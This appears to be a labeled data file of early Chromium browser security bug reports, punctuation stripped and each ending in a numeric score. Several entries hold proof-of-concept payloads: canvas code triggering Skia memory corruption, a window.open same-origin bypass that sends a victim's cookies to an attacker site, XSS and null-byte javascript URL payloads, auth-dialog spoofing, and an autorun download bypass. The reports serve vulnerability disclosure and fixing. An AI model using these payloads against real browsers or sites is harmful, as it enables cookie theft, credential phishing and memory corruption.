security sanitize urls better before creating desktop shortcuts on windows we currently create desktop shortcuts the following way x path\to\chrome.exe app url we filter url for etc but we otherwise let most other data indiscriminately one of the characters that is not filtered is e.g stray will not be encoded as 25 or removed this permits a shortcut such as x path\to\chrome.exe app to be created if the user is duped into clicking create application shortcut on a malicious page this syntax will be substituted by windows prior to launching chrome.exe if some_env_variable happens to end with a whitespace things go bad to fix ideally i would recommend a different syntax such as x path\to\chrome.exe launch-in-app-mode this is much more robust we could still support the app syntax for legacy shortcuts if we feel it is too late to change the syntax however we should at the very minimum be more pedantic about escaping here i would also recommend escaping characters such as etc as their effect on windows shell parsing is unclear to me i do n't think it s well-documented anywhere and if they actually legitimately appear in an url the url will be corrupted i did some quick tests on linux but do n't see an obvious way to break it there we escape etc	9
integer overflows in skia walk_edges function third_party/skia/src/core/skscan_path.cpp walk_edges i found two integer overflows int x curre fx sk_fixed1/2 16 here are the definitions for the various elements skfixed fx typedef int32_t skfixed define sk_fixed1 1 16 d if curre fx which is under an attackers controll afaik is larger than max_int this will overflow newx curre fx curre fdx here are the definitions for the various elements skfixed newx skfixed fx skfixed fdx typedef int32_t skfixed adding two int32 may yield a result that is too large for an int32 both values appear to be attacker controlled i m not sure what the impact of these issues is i found a memory corruption using a fuzzer and had a look at the functions on the stack that s how i found these one of these may be responsible for that memory corruption but there are other candidates as well these may only be dos or even just cause crappy rendering i do n't know	11
security skia memory corruption with x 0 in ska blitter blith ska8_blitter blith can be called with x 0 which triggers an assert and later causes memory corruption void ska8_blitter blith int x int y int width skassert x 0 y 0 unsigned x width unsigned fdevice.width if fsrca 0 return uint8_t device fdevice.getaddr8 x y if fsrca 255 memset device width else unsigned scale 256 skalpha255to256 fsrca unsigned srca fsrca for int i 0 i width i device i sktou8 srca skalphamul device i scale negative x will cause an incorrect pointer being returned by fdevice.getaddr8 x y inline uint8_t skbitmap getaddr8 int x int y const skassert fpixels skassert fconfig ka8_config fconfig kindex8_config skassert unsigned x fwidth unsigned y fheight return uint8_t fpixels y frowbytes x the pointer is used to write data which causes incorrect memory to be overwritten repro code html body onload go body script function go ocanvas=document.createelement canvas ocanvas.width=1000 o2dcontext=ocanvas.getcontext 2d o2dcontext.shadowblur=9 o2dcontext.settransform 0,9 000001,10000,0,0 o2dcontext.transform 0,100,71,9,0,7 o2dcontext.settransform 0,6,95,4,1,0 o2dcontext.fillrect 0 9,5,39 settimeout location.reload 1 script html	11
security crash when opening a corrupted gif image platform tested chromium 4.0.252.0 32323 on linux 32bit repeatable unfortunately no it happened only once with this file but maybe stack-trace will be helpful for image parser gurus demo stack trace program received signal sigsegv segmentation fault switching to thread lwp 19867 in webcore gifimagedecoder havedecodedrow this frameindex=0 rowbuffer repeats 18 times b\b8l8l rowend rownumber=1 repeatcount=1 writetransparentpixels=false at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/platform/image decoders/imagedecoder.h:166 166 build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/platform/image-decoders/imagedecoder.h no such file or directory in build/buildd/chromium-browser 4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/platform/image-decoders/imagedecoder.h gdb bt 0 in webcore gifimagedecoder havedecodedrow this frameindex=0 rowbuffer repeats 18 times b\b8l8l rowend rownumber=1 repeatcount=1 writetransparentpixels=false at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/platform/image decoders/imagedecoder.h:166 1 in gifimagereader output_row this at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/platform/image decoders/gif/gifimagereader.cpp:163 2 in gifimagereader do_lzw this q at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/platform/image decoders/gif/gifimagereader.cpp:351 3 in gifimagereader read this buf v\235v^\2335 a\a\023 234t 215 215ou9a\a\235t\035dpg\026a\207\035i\v\203 w\027m\trd 205\236\0275/\020bb\t5\224q\210 214q\037\177q6\220\210 003 5\215cd\221^\025hi\032 024 jm 223\205z 230z\032o\004 a 036\214 5\212 b 234 p1\n 2158h\226g m8t\223ekvd\211ysn\032r 016y1\212 fpi len=33476 query=webcore gifimagedecoder giffullquery haltatframe=1 at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/platform/image decoders/gif/gifimagereader.cpp:441 4 in webcore gifimagedecoder decode this query=webcore gifimagedecoder giffullquery haltatframe=1 at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/platform/image decoders/gif/gifimagedecoder.cpp:51 5 in webcore gifimagedecoder framebufferatindex this index=0 at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/platform/image decoders/gif/gifimagedecoder.cpp:178 6 in webcore imagesource createframeatindex this index=0 at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/platform/graphics/imagesource.cpp:128 type return to continue or q return to quit 7 in webcore bitmapimage cacheframe this index=0 at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/platform/graphics/bitmapimage.cpp:121 8 in webcore bitmapimage frameatindex this index=0 at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/platform/graphics/bitmapimage.cpp:208 9 in webcore bitmapimage nativeimageforcurrentframe this at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/platform/graphics/bitmapimage.h:155 10 in webcore bitmapimage draw this ctxt dstrect srcrect compositeop=webcore compositesourceover at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/platform/graphics/skia/imageskia.cpp:41 8 11 in webcore graphicscontext drawimage this image dest src op=webcore compositesourceover uselowqualityscale=false at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/platform/graphics/graphicscontext.cpp:4 56 12 in webcore graphicscontext drawimage this image dest srcrect op=webcore compositesourceover uselowqualityscale=false at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/platform/graphics/graphicscontext.cpp:3 26 13 in webcore graphicscontext drawimage this image r op=webcore compositesourceover uselowqualityscale value optimized out at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/platform/graphics/graphicscontext.cpp:3 16 14 in webcore renderimage paintreplaced this paintinfo tx=8 ty=48 at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit type return to continue or q return to quit webcore/rendering/renderimage.cpp:427 15 in webcore renderreplaced paint this paintinfo tx=8 ty=48 at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/rendering/renderreplaced.cpp:145 16 in webcore inlinebox paint this paintinfo tx=8 ty=8 at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/rendering/inlinebox.cpp:180 17 in webcore inlineflowbox paint this paintinfo tx=8 ty=8 at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/rendering/inlineflowbox.cpp:676 18 in webcore rootinlinebox paint this paintinfo tx=8 ty=8 at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/rendering/rootinlinebox.cpp:165 19 in webcore renderlineboxlist paint this renderer paintinfo tx=8 ty=8 at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/rendering/renderlineboxlist.cpp:204 20 in webcore renderblock paintcontents this paintinfo tx=8 ty=8 at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/rendering/renderblock.cpp:1626 21 in webcore renderblock paintobject this paintinfo tx=8 ty=8 at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/rendering/renderblock.cpp:1715 22 in webcore renderblock paint this paintinfo tx=8 ty=8 type return to continue or q return to quit at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/rendering/renderblock.cpp:1519 23 in webcore renderblock paintchildren this paintinfo tx=8 ty=8 at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/rendering/renderblock.cpp:1652 24 in webcore renderblock paintobject this paintinfo tx=8 ty=8 at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/rendering/renderblock.cpp:1715 25 in webcore renderblock paint this paintinfo tx=8 ty=8 at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/rendering/renderblock.cpp:1519 26 in webcore renderblock paintchildren this paintinfo tx=0 ty=0 at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/rendering/renderblock.cpp:1652 27 in webcore renderblock paintobject this paintinfo tx=0 ty=0 at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/rendering/renderblock.cpp:1715 28 in webcore renderblock paint this paintinfo tx=0 ty=0 at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/rendering/renderblock.cpp:1519 29 in webcore renderlayer paintlayer this rootlayer p paintdirtyrect paintrestriction=webcore paintrestrictionnone paintingroot overlaptestrequests paintflags value optimized out at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/rendering/renderlayer.cpp:2239 type return to continue or q return to quit 30 in webcore renderlayer paintlayer this rootlayer p paintdirtyrect paintrestriction=webcore paintrestrictionnone paintingroot overlaptestrequests paintflags value optimized out at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/rendering/renderlayer.cpp:2264 31 in webcore renderlayer paint this p damagerect paintrestriction=webcore paintrestrictionnone paintingroot at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/rendering/renderlayer.cpp:2043 32 in webcore frameview paintcontents this p rect at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/page/frameview.cpp:1699 33 in webcore scrollview paint this context rect at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/platform/scrollview.cpp:793 34 in webcore renderwidget paint this paintinfo tx=286 ty=0 at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/rendering/renderwidget.cpp:265 35 in webcore renderframeset paint this paintinfo tx=0 ty=0 at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/rendering/renderframeset.cpp:140 36 in webcore renderblock paintchildren this paintinfo tx=0 ty=0 at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/rendering/renderblock.cpp:1652 type return to continue or q return to quit 37 in webcore renderblock paintobject this paintinfo tx=0 ty=0 at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/rendering/renderblock.cpp:1715 38 in webcore renderblock paint this paintinfo tx=0 ty=0 at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/rendering/renderblock.cpp:1519 39 in webcore renderlayer paintlayer this rootlayer p paintdirtyrect paintrestriction=webcore paintrestrictionnone paintingroot overlaptestrequests paintflags value optimized out at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/rendering/renderlayer.cpp:2239 40 in webcore renderlayer paintlayer this rootlayer p paintdirtyrect paintrestriction=webcore paintrestrictionnone paintingroot overlaptestrequests paintflags value optimized out at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/rendering/renderlayer.cpp:2264 41 in webcore renderlayer paint this p damagerect paintrestriction=webcore paintrestrictionnone paintingroot at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/rendering/renderlayer.cpp:2043 42 in webcore frameview paintcontents this p rect at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/page/frameview.cpp:1699 43 in webcore scrollview paint this context rect at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webcore/platform/scrollview.cpp:793 44 in webkit webframeimpl paint this canvas type return to continue or q return to quit rect at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/third_party/webkit/webkit/chromium/src/webframeimpl.cpp:1568 45 in renderwidget paintrect this rect canvas at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/chrome/renderer/render_widget.cc:384 46 in renderwidget dodeferredpaint this at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/chrome/renderer/render_widget.cc:432 47 in renderwidget calldodeferredpaint this at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/chrome/renderer/render_widget.cc:391 48 in messageloop runtask this task at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/base/message_loop.cc:320 49 in messageloop deferorrunpendingtask this pending_task at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/base/message_loop.cc:328 50 in messageloop dowork this at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/base/message_loop.cc:435 51 in base messagepumpdefault run this delegate at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/base/message_pump_default.cc:23 52 in messageloop runinternal this at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/base/message_loop.cc:205 53 in messageloop run this at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/base/message_loop.c type return to continue or q return to quit c:155 54 in base thread threadmain this at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/base/thread.cc:153 55 in threadfunc closure at build/buildd/chromium-browser-4.0.252.0~svn20091118r32323/build tree/src/base/platform_thread_posix.cc:26 56 in start_thread from lib/tls/i686/cmov/libpthread.so.0 57 in clone from lib/tls/i686/cmov/libc.so.6	7
referer header is sent when redirect from https to http i have a proof of concept though it s google-internal visible only those urls are provided below the basic sequence is start at an https url japhet click a link that navigates to an https url redirect.php the link triggers a redirect to an http url when is reached document.referrer will not show a referrer due to but the http referer header will have been sent to google.com even though the referrer is a secure scheme and the destination is n't i ve got a fix for this just about ready so assigning to myself i m marking this p1 because it seems relatively minor to me but correct me if i m wrong	6
window.open method javascript same-origin policy violation chrome version google chrome 3.0.195.38 official build 34131 webkit 532.0 v8 1.2.14.20 user agent mozilla/5.0 windows u windows nt 5.1 en-us applewebkit/532.0 khtml like gecko chrome/3.0.195.38 safari/532.0 urls if applicable n/a other browsers tested add ok or fail after other browsers where you have tested this issue safari 4 ok firefox 3.x ok ie 7 ok ie 8 ok what steps will reproduce the problem 1 invite the victim to the malicious content please see below poc hosted on the attacker s domain 2 an iframe named somename in the malicious content loads data from a third party domain 3 the malicious content executes the javascript code in the window.open method which targets somename 4 that javascript code in the window.open method is executed in the context of the third party domain and can grab the victim s cookie and other data from the third party domain and send these data to the attacker s domain before sending these data chrome sends options method to confirm that the attacker s site allows the cross domain request from the third party site if the attacker s site sends back the response which includes valid access-control-allow-xxx headers chrome makes a request which contains the third party s content and cookie to the attacker s site what is the expected result permission should be denied by same-origin policy what happens instead the attacker can bypass the same-origin policy to steal the victim s cookie and other data from a third party domain via chrome please provide any additional information below attach a screenshot if possible poc html head title window.open method javascript same-origin policy violation title script settimeout steal3rdpartycontent 5000 function steal3rdpartycontent try window.open javascript var x=new xmlhttprequest x.open post site x.send document somename catch e alert e script head body iframe name somename src site body html	7
md audit rpc more errors deserializing skbitmaps from mark 1 bitmap row size desynchronization file chrome/common/common_param_traits.cc function paramtraits skbitmap read problem type logic compromise type local escalation severity medium paramtraits skbitmap read allows a largely unchecked skbitmap_data structure to be used to create an skbitmap while the allocpixels function protects from integer overflows it does so by checking that fheight frowbytes do not overflow however fwidth can be desynchronized from frowbytes which seems to create problems in the privileged process for example when the skbitmap is stored in a thumbnail store via the viewhostmsg_thumbnail message the jpegcodec encodes the data from the skbitmap which does calculations based on the images fwidth value not frowbytes 2 bitmap information leak file chrome/common/common_param_traits.cc function paramtraits skbitmap read problem type information leak compromise type information leak severity medium paramtraits skbitmap read seems to allow you to allocate an skbitmap without supplying enough data to fill it the data buffer it is copied it into is not zero d out and so if a small amount of variable data is supplied the remainder of the buffer will contain random data from the process i am not certain if this data can be read back from the child host but i suspect it can from a thumbnail database or possibly by placing it on a html canvas	11
md audit rpc more errors deserializing skbitmaps from mark 1 bitmap row size desynchronization file chrome/common/common_param_traits.cc function paramtraits skbitmap read problem type logic compromise type local escalation severity medium paramtraits skbitmap read allows a largely unchecked skbitmap_data structure to be used to create an skbitmap while the allocpixels function protects from integer overflows it does so by checking that fheight frowbytes do not overflow however fwidth can be desynchronized from frowbytes which seems to create problems in the privileged process for example when the skbitmap is stored in a thumbnail store via the viewhostmsg_thumbnail message the jpegcodec encodes the data from the skbitmap which does calculations based on the images fwidth value not frowbytes 2 bitmap information leak file chrome/common/common_param_traits.cc function paramtraits skbitmap read problem type information leak compromise type information leak severity medium paramtraits skbitmap read seems to allow you to allocate an skbitmap without supplying enough data to fill it the data buffer it is copied it into is not zero d out and so if a small amount of variable data is supplied the remainder of the buffer will contain random data from the process i am not certain if this data can be read back from the child host but i suspect it can from a thumbnail database or possibly by placing it on a html canvas	11
childprocesssecuritypolicy canrequesturl recusion stack exhaustion in url parsing with nested protocols poc	11
md audit window sandbox preprocessname race condition file sandbox/src/filesystem_policy.cc function preprocessname problem type race condition compromise type local escalation severity high the preprocessname function attempts to validate pathnames received from an untrusted sandboxed process to decide if the file can be legally opened according to the policy for the process it recursively checks if each path segment is a reparse point starting with the full filename and then checking each parent directory until the root is reached if a long pathname is specified it is possible for the sandboxed process to change one of the path segments to contain reparse information and hence be a link after the path has been checked by the privileged process but before the entire pathname has been validated this results in the privileged process incorrectly deciding that the path does not contain any reparse points when in fact it does thus allowing the sandboxed process to access files outside of the policy	11
md audit plugins sandbox violation raw pointer from renderer manipulated in plugin process reported by mark dowd a compromised renderer can pass an arbitrary pointer to the plugin process this pointer is then dereferenced and manipulated written in the plugin process this could be used to corrupt the plugin process and execute arbitrary code outside the sandbox steps to reproduce 1 create a plugin.htm page with the following this just loads the acrobat plugin so you can mess with it embed id pdf type application/pdf hidden true width 0 height 0 embed body script var obj document.getelementbyid pdf var x new object obj.messagehandler x script 2 set a breakpoint in the renderer process on paramtraits npvariant_param write 3 attach to the renderer process and load plugin.htm 4 after breaking change the value of p.type to 7 which is npvariant_param_object_pointer it should initially be 6 which is npvariant_param_object_routing_id 5 change the value of p.npobject_pointer to or any garbage value to trigger a crash on a write violation in the plugin process the plugin process will read the supplied value with paramtraits npvariant_param read and treat it as an npobject pointer the reference count address+4 on x86 is incremented shortly after reading which is why a crash occurs when an invalid address is provided the crashing stack in the plugin process looks like this chrome.dll npn_retainobject npobject npobject line 286 c chrome.dll createnpvariant const npvariant_param param pluginchannelbase channel npvariant result int containing_window const gurl page_url line 260 bytes c chrome.dll npobjectstub onsetproperty const npidentifier_param name const npvariant_param property ipc message reply_msg=class index line 219 bytes c chrome.dll ipc messagewithreply tuple2 npidentifier_param npvariant_param tuple1 bool dispatchdelayreply npobjectstub void thiscall npobjectstub npidentifier_param const npvariant_param const ipc message const ipc message msg=class index npobjectstub obj void const npidentifier_param const npvariant_param ipc message func line 1218 bytes c chrome.dll npobjectstub onmessagereceived const ipc message msg=class index line 78 bytes c chrome.dll messagerouter routemessage const ipc message msg=class index line 40 bytes c chrome.dll pluginchannelbase onmessagereceived const ipc message message=class index line 137 c chrome.dll pluginchannel onmessagereceived const ipc message msg=class index line 199 bytes c chrome.dll messageloop runtask task task line 321 c	11
md audit window sandbox preprocessname race condition file sandbox/src/filesystem_policy.cc function preprocessname problem type race condition compromise type local escalation severity high the preprocessname function attempts to validate pathnames received from an untrusted sandboxed process to decide if the file can be legally opened according to the policy for the process it recursively checks if each path segment is a reparse point starting with the full filename and then checking each parent directory until the root is reached if a long pathname is specified it is possible for the sandboxed process to change one of the path segments to contain reparse information and hence be a link after the path has been checked by the privileged process but before the entire pathname has been validated this results in the privileged process incorrectly deciding that the path does not contain any reparse points when in fact it does thus allowing the sandboxed process to access files outside of the policy	6
md audit plugins sandbox violation raw pointer from renderer manipulated in plugin process reported by mark dowd a compromised renderer can pass an arbitrary pointer to the plugin process this pointer is then dereferenced and manipulated written in the plugin process this could be used to corrupt the plugin process and execute arbitrary code outside the sandbox steps to reproduce 1 create a plugin.htm page with the following this just loads the acrobat plugin so you can mess with it embed id pdf type application/pdf hidden true width 0 height 0 embed body script var obj document.getelementbyid pdf var x new object obj.messagehandler x script 2 set a breakpoint in the renderer process on paramtraits npvariant_param write 3 attach to the renderer process and load plugin.htm 4 after breaking change the value of p.type to 7 which is npvariant_param_object_pointer it should initially be 6 which is npvariant_param_object_routing_id 5 change the value of p.npobject_pointer to or any garbage value to trigger a crash on a write violation in the plugin process the plugin process will read the supplied value with paramtraits npvariant_param read and treat it as an npobject pointer the reference count address+4 on x86 is incremented shortly after reading which is why a crash occurs when an invalid address is provided the crashing stack in the plugin process looks like this chrome.dll npn_retainobject npobject npobject line 286 c chrome.dll createnpvariant const npvariant_param param pluginchannelbase channel npvariant result int containing_window const gurl page_url line 260 bytes c chrome.dll npobjectstub onsetproperty const npidentifier_param name const npvariant_param property ipc message reply_msg=class index line 219 bytes c chrome.dll ipc messagewithreply tuple2 npidentifier_param npvariant_param tuple1 bool dispatchdelayreply npobjectstub void thiscall npobjectstub npidentifier_param const npvariant_param const ipc message const ipc message msg=class index npobjectstub obj void const npidentifier_param const npvariant_param ipc message func line 1218 bytes c chrome.dll npobjectstub onmessagereceived const ipc message msg=class index line 78 bytes c chrome.dll messagerouter routemessage const ipc message msg=class index line 40 bytes c chrome.dll pluginchannelbase onmessagereceived const ipc message message=class index line 137 c chrome.dll pluginchannel onmessagereceived const ipc message msg=class index line 199 bytes c chrome.dll messageloop runtask task task line 321 c	6
clear browsing data dialog is missing an option for html5 storage facilities local storage web database not a security bug per-se so not filing as security but people are likely going to be peeved if we do n't take care of this before mstone-4 stable the clear browsing data dialog is a nice one-stop shop to permit deletion of any and all persistent state that could be used to track users no option to clear the html5 storage facilities seems like a serious omission	11
sts design questions around probing what sites a user has been to sts can be a privacy leak/method of tracking users imagine a scenario where you have one website that a user is interacting with say an evil advertising empire intent on tracking people for marketing purposes on that ssl/tls enabled website there are a series of iframes each iframe leads to different http not https servers the first iframe call it iframe00 is the check to see if the user has been to the site before it automatically redirects the user to the https site via 301 redirect the fact that the user hit the http site at all means they have n't been there before which brings us to the first use case use case 1 if the user has not been to the evil website before which can be found out because the user will hit the http version of frame00 before being redirected to the sts enabled ssl/tls version of that subdomain a series of iframes will selectively turn sts on and off on each subdomain those subdomains will essentially provide one bit of information collectively that maps to a user profile in the database for instance frame01 sts frame02 http frame03 sts frame04 sts could map to binary 1011 decimal 11 or the 11th user to visit the site the number of iframes required is based on the total number of users that the site believed it would need to track over it s lifetime or 33 iframes total which would enable enough bits for the 1.7bn internet users use case 2 if the user has been to the site before they will not hit the http site on frame00 the check website and they instead are immediately sent to the sts site the evil website can begin to calculate who that user corresponds to by setting every frame to the http sites not sts enabled ssl/tls sites and seeing which ones instead go to the https site the evil site can map those bits back to the corresponding user that the site has seen before it may be argued that sts does not represent any significant privacy risk because users can disable sts by deleting the setting for all websites that use the feature in question upon shutdown or whatever mechanisms you provide to do so periodically but in that case the value of sts is dubious because the user will be erasing the setting where it is actually valuable to stop a man in the middle ssl/tls downgrade therefore i believe it s a flaw in sts rsnake p.s this is n't my actual email address just my test/garbage account feel free to email me directly at h ckers.org oh and btw very clever idea with the contest i ll be curious to see how this goes for you	11
chrome allows redirect to proceed through safebrowsing warning steps to reproduce visit the site which is on the phishing blacklist a safebrowsing warning will appear briefly but the page will continue to redirect to the expected behavior is that the redirect is not followed note that the site sets a cookie when you visit the initial url and subsequent loads will not redirect the same way if you want to reproduce it again use incognito mode or clear cookies for zobeo.com and www.zobeo.com i m using chrome 4.0.249.89 on windows xp	2
webcore document recalcstyleselector hi i think i found a bug of chrome i test it on chrome 4 and 3 on version 4 maybe you need refresh some times it works and the stack like this 00aff7a4 01c78fca 00084000 00000000 008f2e70 chrome_1c30000 webcore document recalcstyleselector conv thiscall c b\slave\chrome-official-2 build\src\third_party\webkit\webcore\dom\document.cpp 2340 00aff7b8 01cbc6cf 00000000 00d9a3c0 00d9a3c0 chrome_1c30000 webcore document updatestyleselector conv thiscall c b\slave\chrome-official-2 build\src\third_party\webkit\webcore\dom\document.cpp 2271 00aff7c8 01cbc6cf 00000000 00d9a440 00d9a440 chrome_1c30000 webcore containernode removedfromdocument fpo 0,1,2 conv thiscall c b\slave\chrome-official-2 build\src\third_party\webkit\webcore\dom\containernode.cpp 608 00aff7d8 01cbc6cf 00000000 008f78c0 008f78c0 chrome_1c30000 webcore containernode removedfromdocument fpo 0,1,2 conv thiscall c b\slave\chrome-official-2 build\src\third_party\webkit\webcore\dom\containernode.cpp 608 00aff7e8 01cbc6cf 00000000 008f4c30 008f4f00 chrome_1c30000 webcore containernode removedfromdocument fpo 0,1,2 conv thiscall c b\slave\chrome-official-2 build\src\third_party\webkit\webcore\dom\containernode.cpp 608 00aff7f8 01cbd08a 008f7e00 008f4ca4 01cbcffd chrome_1c30000 webcore containernode removedfromdocument fpo 0,1,2 conv thiscall c b\slave\chrome-official-2 build\src\third_party\webkit\webcore\dom\containernode.cpp 608 00aff804 01cbcffd 00aff820 00aff81c 008f4ca4 chrome_1c30000 webcore private addchildnodestodeletionqueue webcore node webcore conta inernode fpo 2,0,0 conv cdecl c b\slave\chrome-official-2 build\src\third_party\webkit\webcore\dom\containernodealgorithms.h 139 maybe this one is like those i have reported to zdi if so forget it by the way i got a lot of unexploitable bugs of chrome these bugs are valuable	11
security http auth dialog spoofing using long subdomains windows only chrome 4.0.249.89 5.0.335.0 platform windows xp windows 7 exploit does not work on mac snow leopard ubuntu karmic for latest versions of chrome testcase assumptions trusted site securethoughts.com evil site infernohacks.com visit loc=takeanyservice.securethoughts.com.certifiedbyverisigncorporation.infernohacks.com/diges t.php description in this testcase i assume the trusted site has a open redirect lets say in redir.php loc paramater there are other ways to do this as well i point it to my evil site infernohacks.com digest.php page which brings up an http digest auth dialog a normal user who visits this url will see it beginning with his trusted host name then when http digest auth dialog comes up the real site infernohacks.com name get truncated due to longer subdomains this normal user wo n't suspect anything and will put his/her site credentials which will get sent to my evil site expected like all other browsers it should show the complete hostname and not truncate any part of it should wrap around in next line	1
bypass unsafe file types dialog using extra dots at end of file name describe security bug here with as much details and steps to reproduce as possible security bugs are visible only to the reporter and to project members see the sample iframe src setup.exe iframe so the chrome will download it with no confirm iframe src autorun.inf iframe set iis analysis inf as asp autorun.inf response.contenttype application/zip autorun open=setup.exe 0 shell\open o shell\open\command=setup.exe o shell\explore\command setup.exe e this will download antorun.inf and setup to the download document when user open download setup.exe runs	9
javascript url with a leading null byte can bypass cross origin protection describe security bug here with as much details and steps to reproduce as possible security bugs are visible only to the reporter and to project members see sample hehe.html iframe name test src iframe input type=button value test onclick window.open u0000javascript alert document.cookie test or iframe name test src iframe input type=button value test onclick window.open x00javascript alert document.cookie test	7
webcore svguseelement updatecontaineroffsets execav arbitrary 1dc75f12fe3750aa1828ea20506a5d54 opening the attached svg file or a page containing it causes a segmentation fault in webcore svguseelement sethrefbasevalue in 32-bit ubuntu 9.10 builds 36515 up to the current 40259 appear to be affected in 64-bit fedora 12 the issue manifests as the tab getting stuck in loading sad tab or a browser crash segmentation fault after a possible double-free or memory corruption when using google chrome 5.0.307.9 official build 39052 beta or chromium 5.0.339.0 developer build 40152 i have no proof that this is exploitable reported as a security issue to be on the safe side	9
crash with form tag form form like this	11
security path traversal in devtools chrome devtools/inspector.html my documents/downloads/test.html will open a file called test.html in your downloads directory	2
security xss in net-internals chrome net-internals/view-cache script alert chrome script this was found by swiecki	9
security xss in chrome downloads download this file img src=t onerror=alert 1 and view chrome downloads	9
an http page loaded quickly after ntp can gain domui bindings privilege problem if you start a new load on the same tab before the new tab process commits the load you can get the site to load in the same process as the ntp and it will have the dom_ui_enabled bit set this race has been hit by users and is the underlying cause for it causes form submission to appear as flaky since when the page gets loaded into ntp process forms will submit as a get instead of a post until the page is reloaded into a new tab reproduction steps chrome renderer-startup-dialog no-sandbox 1 open a new tab page the renderer will be frozen due to an alert box 2 type the url 3 dismiss the renderer start dialog to resume the renderer or alternately on mac/linux you can use gdb in place of the startup dialog to fake the latency chrome renderer-cmd-prefix='gdb args now if you attach to the renderer process hosting the webpage you will find that dom_ui_enabled is set for its renderview moreover if you follow the instructions on the chrome_bug.php page you will find that the form submission does not work the reason is it gets short-circuited in renderview decidepolicyfornavigation because of the value of dom_ui_enabled	2
security v8 webkitpoint memory corruption by calling window.webkitpoint we are causing some kind of memory corruption in v8 the following two html files will trigger the issue by calling the method in an iframe while the main page refreshes the iframe from time to time to cause garbagecollection which exposes the memory corruption repro5.1.html iframe src=repro5.2.html iframe script setinterval function document.body.innerhtml iframe src=repro5.2.html iframe br new date 300 script repro5.2.html script language javascript setinterval window.webkitpoint 10 script crashes vary i expect this to be the main culprit behind the ref_fuzz crashes	11
